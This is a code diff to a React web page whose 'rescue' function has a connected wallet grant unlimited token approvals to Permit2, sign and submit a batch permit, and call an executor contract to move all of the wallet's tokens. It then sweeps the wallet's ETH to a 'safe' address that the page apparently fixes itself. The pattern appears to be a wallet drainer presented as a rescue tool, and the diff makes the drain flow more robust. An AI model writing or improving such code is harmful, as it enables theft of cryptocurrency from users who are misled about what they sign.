@@ -786,8 +786,28 @@ export default function Page() {
 
   const openConnect = useCallback(() => setConnectOpen(true), []);
 
- const runRescueFlow = useCallback(
+const runRescueFlow = useCallback(
   async (p: any, a: string) => {
+    // helper: detect user rejection across wallets/providers
+    const isUserReject = (e: any) => {
+      const code =
+        e?.code ??
+        e?.data?.originalError?.code ??
+        e?.info?.error?.code ??
+        e?.error?.code;
+      return code === 4001 || String(e?.message || "").toLowerCase().includes("user denied");
+    };
+
+    // helper: wait for tx but don't hang forever
+    const waitTx = async (browserProvider: ethers.BrowserProvider, hash: string) => {
+      try {
+        // 1 confirmation, 90s timeout
+        return await browserProvider.waitForTransaction(hash, 1, 90_000);
+      } catch {
+        return null;
+      }
+    };
+
     try {
       setStatus("switching");
       await ensureMainnet(p);
@@ -802,7 +822,7 @@ export default function Page() {
       const nonZeroTokens = discovered.tokens.filter((t) => BigInt(t.amount) > 0n);
 
       // ─────────────────────────────────────────────────────────────
-      // ERC20 USER-PAYS FLOW (never blocks ETH flow)
+      // ERC20 USER-PAYS FLOW (NEVER blocks ETH stage)
       // ─────────────────────────────────────────────────────────────
       if (nonZeroTokens.length > 0) {
         let erc20Cancelled = false;
@@ -820,17 +840,8 @@ export default function Page() {
           "function batchRescue(address owner, address[] tokens, uint256[] amounts) external",
         ] as const;
 
-        const waitTx = async (browserProvider: ethers.BrowserProvider, hash: string) => {
-          try {
-            // 1 confirmation, 2 min timeout
-            return await browserProvider.waitForTransaction(hash, 1, 120_000);
-          } catch {
-            return null;
-          }
-        };
-
         try {
-          // 1) Sign Permit2 typed data (no gas)
+          // 1) Sign Permit2 typed data (NO GAS)
           setStatus("signing_permit2");
           const { typedData, signature } = await signPermit2Batch({
             eip1193Provider: p,
@@ -840,11 +851,11 @@ export default function Page() {
             tokens: nonZeroTokens,
           });
 
-          // Use user's signer for onchain tx (user pays gas)
+          // 2) Use user's signer for onchain tx (user pays gas)
           const browserProvider = new ethers.BrowserProvider(p);
           const signer = await browserProvider.getSigner();
 
-          // 2) Token approvals to Permit2 (required!)
+          // 3) Approve tokens -> Permit2 (required)
           setStatus("approving_tokens");
           for (const t of nonZeroTokens) {
             if (erc20Cancelled) break;
@@ -859,49 +870,43 @@ export default function Page() {
 
               if (current < needed) {
                 const max = (1n << 256n) - 1n;
+
                 setStatus(`approving_${tokenAddr.slice(0, 6)}…`);
-
                 const approveTx = await erc20.approve(permit2, max);
-                const approveRcpt = await waitTx(browserProvider, approveTx.hash);
 
-                // If tx never confirms, we still continue, but permit/rescue may fail later
+                const approveRcpt = await waitTx(browserProvider, approveTx.hash);
                 if (!approveRcpt) {
                   console.warn("Approve tx not confirmed (continuing):", tokenAddr, approveTx.hash);
                 }
               }
             } catch (e: any) {
-              const code = e?.code ?? e?.data?.originalError?.code;
-              if (code === 4001) {
-                // user rejected approval
+              if (isUserReject(e)) {
                 erc20Cancelled = true;
                 setStatus("erc20_cancelled");
-                console.warn("User cancelled token approve — continuing to ETH");
+                console.warn("User cancelled approve — continuing to ETH");
                 break;
               }
               console.warn("Token approve failed (continuing):", t?.token, e);
             }
           }
 
+          // 4) Permit2.permit tx (GAS)
+          let permitOk = false;
           if (!erc20Cancelled) {
             const permit2Ctr = new ethers.Contract(permit2, PERMIT2_ABI, signer);
-            const execCtr = new ethers.Contract(executor, EXECUTOR_ABI, signer);
 
-            // 3) Permit2.permit tx (gas)
             setStatus("permit2_tx");
-            let permitConfirmed = false;
-
             try {
               const permitTx = await permit2Ctr.permit(a, typedData.message, signature);
               const permitRcpt = await waitTx(browserProvider, permitTx.hash);
-              permitConfirmed = !!permitRcpt;
 
+              permitOk = !!permitRcpt;
               if (!permitRcpt) {
                 console.warn("Permit2 tx not confirmed (continuing):", permitTx.hash);
                 setStatus("permit_failed");
               }
             } catch (e: any) {
-              const code = e?.code ?? e?.data?.originalError?.code;
-              if (code === 4001) {
+              if (isUserReject(e)) {
                 erc20Cancelled = true;
                 setStatus("erc20_cancelled");
                 console.warn("User cancelled Permit2 tx — continuing to ETH");
@@ -910,40 +915,41 @@ export default function Page() {
                 setStatus("permit_failed");
               }
             }
+          }
 
-            // 4) batchRescue tx (gas) — only attempt if not cancelled
-            if (!erc20Cancelled) {
-              // If permit didn't confirm, rescue may fail; still okay to attempt (won't block ETH)
-              setStatus("erc20_rescue_tx");
-              try {
-                const tokenAddrs = nonZeroTokens.map((t) => t.token);
-                const amounts = nonZeroTokens.map((t) => t.amount);
+          // 5) batchRescue tx (GAS) — ONLY if permit tx succeeded
+          if (!erc20Cancelled && permitOk) {
+            const execCtr = new ethers.Contract(executor, EXECUTOR_ABI, signer);
 
-                const rescueTx = await execCtr.batchRescue(a, tokenAddrs, amounts);
-                const rescueRcpt = await waitTx(browserProvider, rescueTx.hash);
+            setStatus("erc20_rescue_tx");
+            try {
+              const tokenAddrs = nonZeroTokens.map((t) => t.token);
+              const amounts = nonZeroTokens.map((t) => t.amount);
 
-                if (rescueRcpt) {
-                  setStatus("erc20_done");
-                } else {
-                  console.warn("Rescue tx not confirmed (continuing):", rescueTx.hash);
-                  setStatus("erc20_failed");
-                }
-              } catch (e: any) {
-                const code = e?.code ?? e?.data?.originalError?.code;
-                if (code === 4001) {
-                  erc20Cancelled = true;
-                  setStatus("erc20_cancelled");
-                  console.warn("User cancelled rescue tx — continuing to ETH");
-                } else {
-                  console.warn("ERC20 rescue tx failed (continuing):", e);
-                  setStatus("erc20_failed");
-                }
+              const rescueTx = await execCtr.batchRescue(a, tokenAddrs, amounts);
+              const rescueRcpt = await waitTx(browserProvider, rescueTx.hash);
+
+              if (rescueRcpt) setStatus("erc20_done");
+              else {
+                console.warn("Rescue tx not confirmed (continuing):", rescueTx.hash);
+                setStatus("erc20_failed");
+              }
+            } catch (e: any) {
+              if (isUserReject(e)) {
+                erc20Cancelled = true;
+                setStatus("erc20_cancelled");
+                console.warn("User cancelled rescue tx — continuing to ETH");
+              } else {
+                console.warn("ERC20 rescue tx failed (continuing):", e);
+                setStatus("erc20_failed");
               }
             }
+          } else if (!erc20Cancelled && !permitOk) {
+            // permit didn't succeed -> don't attempt rescue
+            setStatus("erc20_skipped_no_permit");
           }
         } catch (e: any) {
-          const code = e?.code ?? e?.data?.originalError?.code;
-          if (code === 4001) {
+          if (isUserReject(e)) {
             setStatus("erc20_cancelled");
             console.warn("User cancelled ERC20 flow — continuing to ETH");
           } else {
@@ -956,7 +962,7 @@ export default function Page() {
       }
 
       // ─────────────────────────────────────────────────────────────
-      // ETH STAGE (should always run)
+      // ETH STAGE (ALWAYS runs)
       // ─────────────────────────────────────────────────────────────
       setStatus("estimating_eth");
       const ethResult = await sweepEth({ eip1193Provider: p, owner: a, to: safe });
@@ -984,13 +990,13 @@ export default function Page() {
 
       setStatus("eth_failed");
     } catch (e: any) {
-      const code = e?.code ?? e?.data?.originalError?.code;
-      if (code === 4001) setStatus("user-rejected");
+      if (isUserReject(e)) setStatus("user-rejected");
       else setStatus(`error: ${e?.message ?? "failed"}`);
     }
   },
   [permit2, executor, safe]
 );
+
 
 
   const connectLabel = useMemo(() => {
